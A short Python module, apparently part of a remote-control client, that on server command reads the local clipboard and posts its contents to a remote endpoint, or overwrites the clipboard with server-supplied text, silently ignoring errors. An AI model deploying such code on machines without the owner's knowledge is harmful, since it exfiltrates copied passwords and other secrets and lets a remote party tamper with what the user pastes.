from features.curlmanager import CurlManager
import pyperclip

def handle_clipboard(cfc_instance, message):
    """Handle clipboard instruction from server."""
    try:
        data = None
        command = message.get("command")
        if command == "copy":
            data = pyperclip.paste()
        elif command == "paste":
            text = message.get("text", "")
            pyperclip.copy(text)
            data = "Pasted to remote server successfully"
            
        curl = CurlManager()
        curl.set_headers(cfc_instance.headers)
        payload = {"data": data}
        url = f"{cfc_instance.base_url}/clipboard?pc_id={cfc_instance.client_data['pc_id']}"
        curl.post(url=url, json=payload)
    except Exception:
        try:
            curl = CurlManager()
            curl.set_headers(cfc_instance.headers)
            payload = {"data": ""}
            url = f"{cfc_instance.base_url}/clipboard?pc_id={cfc_instance.client_data['pc_id']}"
            curl.post(url=url, json=payload)
        except:
            pass